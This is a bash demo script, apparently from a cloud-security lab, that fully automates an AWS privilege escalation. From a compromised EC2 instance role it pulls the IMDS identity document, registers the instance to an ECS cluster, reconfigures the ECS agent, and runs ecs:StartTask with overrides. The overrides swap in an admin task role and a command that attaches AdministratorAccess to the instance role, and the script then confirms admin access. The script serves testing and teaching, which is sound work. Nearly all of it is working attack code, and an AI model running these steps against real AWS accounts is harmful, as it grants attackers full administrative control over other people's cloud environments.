#!/bin/bash

# Demo script for ecs:RegisterContainerInstance + iam:PassRole + ecs:StartTask privilege escalation
#
# Based on: https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path
#
# Starting principal: EC2 instance role (pl-prod-ecs-007-to-admin-instance-role)
# Attack permissions: ecs:RegisterContainerInstance, ecs:StartTask, iam:PassRole, ecs:DeregisterContainerInstance
#
# This demo uses SSM SendCommand to simulate RCE (initial access to the EC2 instance).
# SSM is NOT part of the attack - in the real world, the attacker would have shell access
# via a vulnerability (e.g., SSRF, RCE in a web app running on the EC2).
# All attack commands run on the EC2 using the instance role's IMDS credentials.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command (commands run on the EC2)
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
INSTANCE_ROLE_NAME="pl-prod-ecs-007-to-admin-instance-role"
ADMIN_ROLE="pl-prod-ecs-007-to-admin-target-role"
EXISTING_TASK_FAMILY="pl-prod-ecs-007-existing-task"
CONTAINER_NAME="pl-prod-ecs-007-benign-container"
HOLDING_CLUSTER="pl-prod-ecs-007-holding"

# Helper: Send an SSM command and wait for completion, return stdout
# Usage: ssm_exec "command string"
# Sets SSM_OUTPUT and SSM_EXIT_CODE
ssm_exec() {
    local CMD_STRING="$1"
    local TIMEOUT="${2:-120}"

    local RESULT
    RESULT=$(aws ssm send-command \
        --instance-ids "$EC2_INSTANCE_ID" \
        --document-name "AWS-RunShellScript" \
        --parameters "{\"commands\":[\"$CMD_STRING\"]}" \
        --timeout-seconds "$TIMEOUT" \
        --region "$AWS_REGION" \
        --output json 2>&1)

    local CMD_ID
    CMD_ID=$(echo "$RESULT" | jq -r '.Command.CommandId // empty')

    if [ -z "$CMD_ID" ]; then
        SSM_OUTPUT="Failed to send SSM command: $RESULT"
        SSM_EXIT_CODE=1
        return 1
    fi

    # Wait for completion
    local MAX_WAIT=24
    local WAIT_ATTEMPT=0
    local STATUS=""

    while [ $WAIT_ATTEMPT -lt $MAX_WAIT ]; do
        WAIT_ATTEMPT=$((WAIT_ATTEMPT + 1))
        sleep 5

        STATUS=$(aws ssm get-command-invocation \
            --command-id "$CMD_ID" \
            --instance-id "$EC2_INSTANCE_ID" \
            --region "$AWS_REGION" \
            --query 'Status' \
            --output text 2>/dev/null || echo "Pending")

        # Treat AWS CLI "None" as pending
        if [ "$STATUS" == "None" ]; then STATUS="Pending"; fi

        if [ "$STATUS" == "Success" ] || [ "$STATUS" == "Failed" ] || [ "$STATUS" == "TimedOut" ] || [ "$STATUS" == "Cancelled" ]; then
            break
        fi
    done

    if [ "$STATUS" != "Success" ] && [ "$STATUS" != "Failed" ] && [ "$STATUS" != "TimedOut" ] && [ "$STATUS" != "Cancelled" ]; then
        SSM_OUTPUT="SSM command timed out waiting for completion (last status: $STATUS, command ID: $CMD_ID)"
        SSM_EXIT_CODE=1
        return 1
    fi

    # Retrieve output - use --query with json output to properly handle null values
    SSM_OUTPUT=$(aws ssm get-command-invocation \
        --command-id "$CMD_ID" \
        --instance-id "$EC2_INSTANCE_ID" \
        --region "$AWS_REGION" \
        --query 'StandardOutputContent' \
        --output text 2>/dev/null || echo "")
    # AWS CLI --output text renders null as "None"
    if [ "$SSM_OUTPUT" == "None" ]; then SSM_OUTPUT=""; fi

    local SSM_STDERR
    SSM_STDERR=$(aws ssm get-command-invocation \
        --command-id "$CMD_ID" \
        --instance-id "$EC2_INSTANCE_ID" \
        --region "$AWS_REGION" \
        --query 'StandardErrorContent' \
        --output text 2>/dev/null || echo "")
    if [ "$SSM_STDERR" == "None" ]; then SSM_STDERR=""; fi

    if [ "$STATUS" == "Success" ]; then
        SSM_EXIT_CODE=0
    else
        SSM_EXIT_CODE=1
        # Include stderr details and status in output for debugging
        local ERR_MSG="SSM command $STATUS (command ID: $CMD_ID)"
        if [ -n "$SSM_STDERR" ]; then
            ERR_MSG="${ERR_MSG}\nStdErr: ${SSM_STDERR}"
        fi
        if [ -n "$SSM_OUTPUT" ]; then
            ERR_MSG="${ERR_MSG}\nStdOut: ${SSM_OUTPUT}"
        fi
        SSM_OUTPUT="$ERR_MSG"
    fi

    return $SSM_EXIT_CODE
}

# Helper: Check if SSM agent is online for the EC2 instance
wait_for_ssm() {
    echo "Checking SSM agent connectivity for instance $EC2_INSTANCE_ID..."
    local MAX_ATTEMPTS=12
    local ATTEMPT=0

    while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
        ATTEMPT=$((ATTEMPT + 1))

        local SSM_STATUS
        SSM_STATUS=$(aws ssm describe-instance-information \
            --filters "Key=InstanceIds,Values=$EC2_INSTANCE_ID" \
            --region "$AWS_REGION" \
            --query 'InstanceInformationList[0].PingStatus' \
            --output text 2>/dev/null || echo "Unknown")

        if [ "$SSM_STATUS" == "Online" ]; then
            echo -e "${GREEN}✓ SSM agent is online${NC}"
            return 0
        fi

        echo "Attempt $ATTEMPT: SSM agent status: $SSM_STATUS (waiting...)"
        sleep 10
    done

    echo -e "${RED}Error: SSM agent is not online after $MAX_ATTEMPTS attempts${NC}"
    echo "The EC2 instance may still be starting up. Try again in a minute."
    return 1
}

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}ECS RegisterContainerInstance + PassRole${NC}"
echo -e "${GREEN}+ StartTask Override Privilege Escalation${NC}"
echo -e "${GREEN}Demo (ECS-007)${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${BLUE}Starting principal: EC2 instance role ($INSTANCE_ROLE_NAME)${NC}"
echo -e "${BLUE}Attack permissions: ecs:RegisterContainerInstance, ecs:StartTask,${NC}"
echo -e "${BLUE}                    iam:PassRole, ecs:DeregisterContainerInstance${NC}"
echo -e "${BLUE}${NC}"
echo -e "${BLUE}This demo uses SSM to simulate RCE (shell access on the EC2).${NC}"
echo -e "${BLUE}In the real world, initial access would be via an application vulnerability.${NC}"
echo -e "${BLUE}All attack commands run on the EC2 using the instance role's IMDS credentials.${NC}\n"

# Step 1: Retrieve configuration from Terraform
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get admin cleanup credentials (used ONLY for SSM - simulating RCE access)
ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)

if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
    echo "Make sure the admin cleanup user is deployed"
    exit 1
fi

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_ecs_007_iam_passrole_ecs_starttask_ecs_registercontainerinstance.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract configuration from the grouped output
ECS_CLUSTER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.cluster_name')
TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')
EC2_INSTANCE_ID=$(echo "$MODULE_OUTPUT" | jq -r '.container_instance_id')
INSTANCE_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_principal_arn')

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "EC2 Instance ID: $EC2_INSTANCE_ID"
echo "Instance Role (starting principal): $INSTANCE_ROLE_ARN"
echo "Region: $AWS_REGION"
echo "ECS Cluster: $ECS_CLUSTER_NAME"
echo "Target Role ARN: $TARGET_ROLE_ARN"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Set up SSM access (simulating RCE - NOT part of attack)
echo -e "${YELLOW}Step 2: Setting up SSM access to EC2 (simulating RCE)${NC}"
echo -e "${DIM}(In the real world, the attacker has shell access via an application vulnerability)${NC}"
export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
export AWS_REGION="$AWS_REGION"
unset AWS_SESSION_TOKEN
echo -e "${GREEN}✓ SSM access configured (RCE simulation)${NC}\n"

# Step 2b: Verify SSM agent is online before sending commands
wait_for_ssm || exit 1
echo ""

# Step 3: Verify identity on the EC2 (confirm we're using the instance role)
echo -e "${YELLOW}Step 3: Verifying identity on the compromised EC2${NC}"
echo "Running sts:GetCallerIdentity on the EC2 instance..."

show_attack_cmd "Attacker" "aws sts get-caller-identity"
ssm_exec "aws sts get-caller-identity --output json"

if [ $SSM_EXIT_CODE -eq 0 ]; then
    echo "$SSM_OUTPUT" | jq . 2>/dev/null || echo "$SSM_OUTPUT"
    CURRENT_ROLE=$(echo "$SSM_OUTPUT" | jq -r '.Arn // empty')
    echo -e "${GREEN}✓ Confirmed: Running as instance role on EC2${NC}"
else
    echo -e "${RED}Error: Could not verify identity on EC2${NC}"
    echo "$SSM_OUTPUT"
    exit 1
fi
echo ""

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying instance role does NOT have admin permissions yet${NC}"
echo "Attempting to list IAM users from EC2 (should fail)..."

show_attack_cmd "Attacker" "aws iam list-users --max-items 1"
ssm_exec "aws iam list-users --max-items 1 2>&1 || true"

if echo "$SSM_OUTPUT" | grep -q "AccessDenied\|is not authorized"; then
    echo -e "${GREEN}✓ Confirmed: Instance role cannot list IAM users (as expected)${NC}"
else
    echo -e "${YELLOW}Warning: Unexpected response - instance role may already have elevated permissions${NC}"
    echo "$SSM_OUTPUT"
fi
echo ""

# Step 5: Verify ECS cluster is EMPTY
echo -e "${YELLOW}Step 5: Verifying ECS cluster is EMPTY (no container instances)${NC}"
echo "Cluster: $ECS_CLUSTER_NAME"
echo -e "${BLUE}The EC2 instance exists but its ECS agent points to a non-existent cluster.${NC}"
echo -e "${BLUE}The attacker will call ecs:RegisterContainerInstance directly via the API.${NC}"

# Check from the admin context (instance role doesn't have ListContainerInstances)
show_cmd "Attacker" "aws ecs list-container-instances --cluster $ECS_CLUSTER_NAME"
CONTAINER_INSTANCES=$(aws ecs list-container-instances \
    --region "$AWS_REGION" \
    --cluster "$ECS_CLUSTER_NAME" \
    --query 'containerInstanceArns' \
    --output json 2>/dev/null || echo "[]")

INSTANCE_COUNT=$(echo "$CONTAINER_INSTANCES" | jq 'length')
if [ "$INSTANCE_COUNT" == "0" ]; then
    echo -e "${GREEN}✓ Confirmed: Cluster is EMPTY - no container instances (as expected)${NC}"
else
    echo -e "${YELLOW}Warning: Found $INSTANCE_COUNT container instance(s) already registered${NC}"
    echo "This may be from a previous demo run. Run cleanup_attack.sh first."
fi
echo ""

# Step 6: Register EC2 to the ECS cluster via direct API call
echo -e "${YELLOW}Step 6: Calling ecs:RegisterContainerInstance directly via API from EC2${NC}"
echo -e "${BLUE}The attacker retrieves the instance identity document and signature from IMDS,${NC}"
echo -e "${BLUE}then calls ecs:RegisterContainerInstance directly (not through the ECS agent).${NC}"
echo -e "${BLUE}This registers the EC2 instance with the target ECS cluster.${NC}"
echo -e "${BLUE}Reference: https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path${NC}"
echo ""

# Build the registration script to run on EC2
# Uses heredoc with single-quoted delimiter to preserve all bash variables literally
REGISTER_SCRIPT=$(cat <<'REGEOF'
#!/bin/bash
IDENTITY_DOC=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/document)
IDENTITY_SIG=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/signature | tr -d '\n')
TOTAL_CPU=$(($(nproc --all) * 1024))
TOTAL_MEM=$(grep MemTotal /proc/meminfo | awk '{print int($2/1024)}')
aws ecs register-container-instance \
    --region __REGION__ \
    --cluster __CLUSTER__ \
    --instance-identity-document "$IDENTITY_DOC" \
    --instance-identity-document-signature "$IDENTITY_SIG" \
    --total-resources "[{\"name\":\"CPU\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_CPU},{\"name\":\"MEMORY\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_MEM}]" \
    --query 'containerInstance.containerInstanceArn' \
    --output text
REGEOF
)

# Substitute placeholders with actual values
REGISTER_SCRIPT="${REGISTER_SCRIPT//__REGION__/$AWS_REGION}"
REGISTER_SCRIPT="${REGISTER_SCRIPT//__CLUSTER__/$ECS_CLUSTER_NAME}"

show_attack_cmd "Attacker" "curl -s http://169.254.169.254/latest/dynamic/instance-identity/document"
show_attack_cmd "Attacker" "curl -s http://169.254.169.254/latest/dynamic/instance-identity/signature"
show_attack_cmd "Attacker" "aws ecs register-container-instance --cluster $ECS_CLUSTER_NAME --instance-identity-document \$IDENTITY_DOC --instance-identity-document-signature \$IDENTITY_SIG --total-resources '[...]'"

# Base64 encode script and send to EC2 (avoids quoting issues with SSM parameters JSON)
REGISTER_B64=$(echo "$REGISTER_SCRIPT" | base64 | tr -d '\n')
ssm_exec "echo $REGISTER_B64 | base64 -d > /tmp/register.sh && chmod +x /tmp/register.sh && bash /tmp/register.sh"

if [ $SSM_EXIT_CODE -ne 0 ]; then
    echo -e "${RED}Error: RegisterContainerInstance failed${NC}"
    echo "$SSM_OUTPUT"
    exit 1
fi

CONTAINER_INSTANCE_ARN=$(echo "$SSM_OUTPUT" | tr -d '[:space:]')

if [ -z "$CONTAINER_INSTANCE_ARN" ] || [ "$CONTAINER_INSTANCE_ARN" == "None" ]; then
    echo -e "${RED}Error: Could not extract container instance ARN${NC}"
    echo "Raw output: $SSM_OUTPUT"
    exit 1
fi

echo "Container Instance ARN: $CONTAINER_INSTANCE_ARN"
echo -e "${GREEN}✓ Successfully registered EC2 to cluster via direct API call${NC}"
echo ""

# Step 7: Reconfigure ECS agent to connect to the cluster
echo -e "${YELLOW}Step 7: Reconfiguring ECS agent to connect to the target cluster${NC}"
echo -e "${BLUE}Now that the EC2 is registered via direct API call, the attacker reconfigures${NC}"
echo -e "${BLUE}the ECS agent to connect to the cluster. The agent will update the container${NC}"
echo -e "${BLUE}instance with proper capability attributes (Docker version, OS type, etc.)${NC}"
echo -e "${BLUE}needed for task placement.${NC}"
echo ""

RECONFIG_CMD="sed -i 's/$HOLDING_CLUSTER/$ECS_CLUSTER_NAME/' /etc/ecs/ecs.config && systemctl restart ecs && echo 'ECS agent reconfigured and restarted'"

show_attack_cmd "Attacker" "sed -i 's/$HOLDING_CLUSTER/$ECS_CLUSTER_NAME/' /etc/ecs/ecs.config && systemctl restart ecs"

ssm_exec "$RECONFIG_CMD"

if [ $SSM_EXIT_CODE -eq 0 ]; then
    echo "$SSM_OUTPUT"
    echo -e "${GREEN}✓ ECS agent reconfigured to join cluster: $ECS_CLUSTER_NAME${NC}"
else
    echo -e "${RED}Error: ECS agent reconfiguration failed${NC}"
    echo "$SSM_OUTPUT"
    exit 1
fi
echo ""

# Step 8: Wait for ECS agent to connect and find the agent-connected container instance
echo -e "${YELLOW}Step 8: Waiting for ECS agent to connect to cluster${NC}"
echo -e "${BLUE}The agent creates its own registration with full capability attributes${NC}"
echo -e "${BLUE}(Docker version, OS type, networking, etc.) needed for task placement.${NC}"
echo ""

# The direct API registration (step 6) demonstrates the RegisterContainerInstance
# technique, but the agent creates its own registration with proper attributes.
# We need to find the agent-connected container instance for StartTask.
DIRECT_API_CI_ARN="$CONTAINER_INSTANCE_ARN"

MAX_AGENT_ATTEMPTS=18
AGENT_ATTEMPT=0
CONTAINER_INSTANCE_ARN=""

while [ $AGENT_ATTEMPT -lt $MAX_AGENT_ATTEMPTS ]; do
    AGENT_ATTEMPT=$((AGENT_ATTEMPT + 1))
    sleep 10

    # List all container instances and find the one with agentConnected=true
    ALL_CI_ARNS=$(aws ecs list-container-instances \
        --region "$AWS_REGION" \
        --cluster "$ECS_CLUSTER_NAME" \
        --query 'containerInstanceArns' \
        --output json 2>/dev/null || echo "[]")

    CI_COUNT=$(echo "$ALL_CI_ARNS" | jq 'length')

    if [ "$CI_COUNT" != "0" ]; then
        # Check each container instance for agentConnected=true
        for CI_ARN in $(echo "$ALL_CI_ARNS" | jq -r '.[]'); do
            AGENT_STATUS=$(aws ecs describe-container-instances \
                --region "$AWS_REGION" \
                --cluster "$ECS_CLUSTER_NAME" \
                --container-instances "$CI_ARN" \
                --query 'containerInstances[0].agentConnected' \
                --output text 2>/dev/null || echo "false")

            if [ "$AGENT_STATUS" == "True" ]; then
                CONTAINER_INSTANCE_ARN="$CI_ARN"
                break
            fi
        done
    fi

    if [ -n "$CONTAINER_INSTANCE_ARN" ]; then
        echo "Attempt $AGENT_ATTEMPT: Found agent-connected container instance"
        echo -e "${GREEN}✓ ECS agent connected to cluster with full capability attributes${NC}"
        break
    else
        echo "Attempt $AGENT_ATTEMPT: Waiting for agent to connect ($CI_COUNT instance(s) registered)..."
    fi
done

if [ -z "$CONTAINER_INSTANCE_ARN" ]; then
    echo -e "${RED}Error: No agent-connected container instance found within timeout${NC}"
    echo "The instance role may need additional ECS agent operational permissions"
    echo "(ecs:DiscoverPollEndpoint, ecs:Poll, etc.)"
    exit 1
fi

echo "Agent Container Instance ARN: $CONTAINER_INSTANCE_ARN"

# Deregister the orphaned direct-API registration if it's different from the agent's
if [ "$DIRECT_API_CI_ARN" != "$CONTAINER_INSTANCE_ARN" ] && [ -n "$DIRECT_API_CI_ARN" ]; then
    echo "Deregistering orphaned direct-API container instance..."
    show_attack_cmd "Attacker" "aws ecs deregister-container-instance --cluster $ECS_CLUSTER_NAME --container-instance $DIRECT_API_CI_ARN"
    ssm_exec "aws ecs deregister-container-instance --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --container-instance $DIRECT_API_CI_ARN --force 2>&1 || true"
    echo -e "${GREEN}✓ Cleaned up orphaned registration${NC}"
fi
echo ""

# Step 9: Discover the pre-existing task definition
echo -e "${YELLOW}Step 9: Discovering existing task definitions${NC}"
echo "Listing task definitions from EC2..."

show_attack_cmd "Attacker" "aws ecs list-task-definitions --family-prefix $EXISTING_TASK_FAMILY --region $AWS_REGION"
ssm_exec "aws ecs list-task-definitions --family-prefix $EXISTING_TASK_FAMILY --region $AWS_REGION --query 'taskDefinitionArns' --output json"

if [ $SSM_EXIT_CODE -eq 0 ]; then
    echo "$SSM_OUTPUT" | jq -r '.[]' 2>/dev/null || echo "$SSM_OUTPUT"
else
    echo -e "${YELLOW}Warning: Could not list task definitions from EC2 (may need ecs:ListTaskDefinitions)${NC}"
    echo "Continuing with known task family: $EXISTING_TASK_FAMILY"
fi

echo ""
echo -e "${BLUE}Key insight: We do NOT need ecs:RegisterTaskDefinition.${NC}"
echo -e "${BLUE}We exploit the existing task definition using ecs:StartTask --overrides${NC}"
echo -e "${BLUE}to override both the command AND the taskRoleArn.${NC}"
echo -e "${GREEN}✓ Identified existing task definition to exploit${NC}\n"

# Step 10: Start ECS task with overrides to escalate privileges
echo -e "${YELLOW}Step 10: Starting ECS task with command and role overrides from EC2${NC}"
echo "Cluster: $ECS_CLUSTER_NAME"
echo "Task Definition: $EXISTING_TASK_FAMILY"
echo "Container Instance: $CONTAINER_INSTANCE_ARN"
echo ""
echo -e "${BLUE}Overrides being applied:${NC}"
echo "  - taskRoleArn: $TARGET_ROLE_ARN (admin role)"
echo "  - command: aws iam attach-role-policy --role-name $INSTANCE_ROLE_NAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
echo ""
echo "This task will attach AdministratorAccess to the instance role: $INSTANCE_ROLE_NAME"
echo ""

# Build the overrides JSON and base64 encode it to avoid quoting issues with SSM
# (nested JSON inside SSM parameters JSON breaks the outer JSON string)
OVERRIDES_JSON='{"taskRoleArn":"'"$TARGET_ROLE_ARN"'","containerOverrides":[{"name":"'"$CONTAINER_NAME"'","command":["iam","attach-role-policy","--role-name","'"$INSTANCE_ROLE_NAME"'","--policy-arn","arn:aws:iam::aws:policy/AdministratorAccess"]}]}'
OVERRIDES_B64=$(echo "$OVERRIDES_JSON" | base64 | tr -d '\n')

# Step 10a: Write overrides file to EC2
ssm_exec "echo $OVERRIDES_B64 | base64 -d > /tmp/overrides.json"
if [ $SSM_EXIT_CODE -ne 0 ]; then
    echo -e "${RED}Error: Failed to write overrides file to EC2${NC}"
    echo "$SSM_OUTPUT"
    exit 1
fi

# Step 10b: Run start-task with overrides from file
show_attack_cmd "Attacker" "aws ecs start-task --cluster $ECS_CLUSTER_NAME --task-definition $EXISTING_TASK_FAMILY --container-instances $CONTAINER_INSTANCE_ARN --overrides file:///tmp/overrides.json"

START_TASK_CMD="aws ecs start-task --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --task-definition $EXISTING_TASK_FAMILY --container-instances $CONTAINER_INSTANCE_ARN --overrides file:///tmp/overrides.json --query [tasks[0].taskArn,failures[0].reason] --output text"

ssm_exec "$START_TASK_CMD"

if [ $SSM_EXIT_CODE -ne 0 ]; then
    echo -e "${RED}Error: StartTask failed${NC}"
    echo "$SSM_OUTPUT"
    exit 1
fi

# Parse the output: "taskArn\tfailureReason" (tab-separated, None for null fields)
TASK_ARN=$(echo "$SSM_OUTPUT" | awk '{print $1}' | tr -d '[:space:]')
FAILURE_REASON=$(echo "$SSM_OUTPUT" | awk '{print $2}' | tr -d '[:space:]')

if [ -n "$FAILURE_REASON" ] && [ "$FAILURE_REASON" != "None" ]; then
    echo -e "${RED}Error: Task start reported failure: $FAILURE_REASON${NC}"
    echo "$SSM_OUTPUT"
    exit 1
fi

if [ -z "$TASK_ARN" ] || [ "$TASK_ARN" == "None" ]; then
    echo -e "${RED}Error: Failed to start ECS task${NC}"
    echo "$SSM_OUTPUT"
    exit 1
fi

echo "Task ARN: $TASK_ARN"
echo -e "${GREEN}✓ Successfully started ECS task with overridden command and role!${NC}\n"

# Step 11: Wait for task to complete
echo -e "${YELLOW}Step 11: Waiting for ECS task to complete${NC}"
echo "Monitoring task status (from admin context)..."

MAX_ATTEMPTS=30
ATTEMPT=0
TASK_STATUS="UNKNOWN"

while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
    ATTEMPT=$((ATTEMPT + 1))

    TASK_INFO=$(aws ecs describe-tasks \
        --region "$AWS_REGION" \
        --cluster "$ECS_CLUSTER_NAME" \
        --tasks "$TASK_ARN" \
        --output json 2>/dev/null)

    if [ $? -eq 0 ]; then
        TASK_STATUS=$(echo "$TASK_INFO" | jq -r '.tasks[0].lastStatus')
        TASK_DESIRED_STATUS=$(echo "$TASK_INFO" | jq -r '.tasks[0].desiredStatus')

        echo "Attempt $ATTEMPT: Task status: $TASK_STATUS (desired: $TASK_DESIRED_STATUS)"

        if [ "$TASK_STATUS" == "STOPPED" ]; then
            EXIT_CODE=$(echo "$TASK_INFO" | jq -r '.tasks[0].containers[0].exitCode // "N/A"')
            echo "Container exit code: $EXIT_CODE"

            if [ "$EXIT_CODE" == "0" ]; then
                echo -e "${GREEN}✓ Task completed successfully!${NC}"
            else
                echo -e "${YELLOW}Warning: Task stopped with exit code: $EXIT_CODE${NC}"
            fi
            break
        fi
    else
        echo "Warning: Could not describe task (attempt $ATTEMPT)"
    fi

    sleep 5
done

if [ $ATTEMPT -ge $MAX_ATTEMPTS ]; then
    echo -e "${YELLOW}Warning: Timeout waiting for task completion${NC}"
    echo "Continuing anyway - the policy may have been attached..."
fi
echo ""

# Step 12: Wait for IAM policy to propagate
echo -e "${YELLOW}Step 12: Waiting for IAM policy changes to propagate${NC}"
echo "IAM changes can take time to propagate across AWS infrastructure..."
sleep 15
echo -e "${GREEN}✓ IAM policy propagation complete${NC}\n"

# Step 13: Verify admin access from the EC2
echo -e "${YELLOW}Step 13: Verifying administrator access from EC2${NC}"
echo "Attempting to list IAM users from EC2 using instance role..."

show_attack_cmd "Attacker" "aws iam list-users --max-items 3"
ssm_exec "aws iam list-users --max-items 3 --output table"

if [ $SSM_EXIT_CODE -eq 0 ]; then
    echo "$SSM_OUTPUT"
    echo -e "${GREEN}✓ Successfully listed IAM users from EC2!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED - Instance role now has AdministratorAccess${NC}"
else
    echo -e "${RED}Failed to list users from EC2${NC}"
    echo "$SSM_OUTPUT"

    # Double check from admin context
    echo ""
    echo "Checking policy attachment from admin context..."
    ATTACHED=$(aws iam list-attached-role-policies \
        --role-name "$INSTANCE_ROLE_NAME" \
        --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`]' \
        --output json 2>/dev/null)

    if echo "$ATTACHED" | grep -q "AdministratorAccess"; then
        echo -e "${GREEN}✓ AdministratorAccess IS attached to the instance role${NC}"
        echo "(IAM may still be propagating - try again in a minute)"
    else
        echo -e "${RED}AdministratorAccess was NOT attached. The escalation may have failed.${NC}"
        exit 1
    fi
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Starting principal: $INSTANCE_ROLE_NAME (EC2 instance role)"
echo "   Permissions: ecs:RegisterContainerInstance, ecs:StartTask, iam:PassRole, ecs:DeregisterContainerInstance"
echo "2. Attacker has RCE on EC2 instance ($EC2_INSTANCE_ID)"
echo "3. Retrieved IMDS instance identity document + signature"
echo "4. Called ecs:RegisterContainerInstance directly via API (registered EC2 to $ECS_CLUSTER_NAME)"
echo "5. Reconfigured ECS agent to join the cluster"
echo "6. Called ecs:StartTask with --overrides:"
echo "   a. Overrode taskRoleArn to admin role: $ADMIN_ROLE"
echo "   b. Overrode container command to attach AdministratorAccess to instance role"
echo "7. Achieved: Administrator Access on the EC2 instance role"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $INSTANCE_ROLE_NAME (RCE on EC2)"
echo "  -> ecs:RegisterContainerInstance (direct API call with IMDS identity docs)"
echo "  -> reconfigure ECS agent"
echo "  -> ecs:StartTask with --overrides (iam:PassRole admin role + command override)"
echo "  -> ECS task attaches AdministratorAccess to instance role"
echo "  -> Admin"

echo -e "\n${YELLOW}Key Differences:${NC}"
echo "  vs ECS-005: No ecs:RegisterTaskDefinition needed - overrides existing task definition"
echo "  vs ECS-008: Uses EC2 launch type (ecs:StartTask) instead of Fargate (ecs:RunTask)"
echo "  vs ECS-009: Requires registering the EC2 to the cluster first (ecs:RegisterContainerInstance)"
echo "              ECS-009 has the instance pre-registered; ECS-007 does not"

echo -e "\n${YELLOW}Reference:${NC}"
echo "  https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands (run on EC2 via instance role):${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- ECS Cluster: $ECS_CLUSTER_NAME (now has a registered container instance)"
echo "- Container Instance ARN: $CONTAINER_INSTANCE_ARN"
echo "- Task ARN: $TASK_ARN"
echo "- Policy attached to instance role: AdministratorAccess"
echo "- EC2 ECS agent reconfigured to point to: $ECS_CLUSTER_NAME"

echo -e "\n${RED}Warning: The instance role now has AdministratorAccess policy attached${NC}"
echo -e "${RED}Warning: The EC2 instance is now registered to the ECS cluster${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
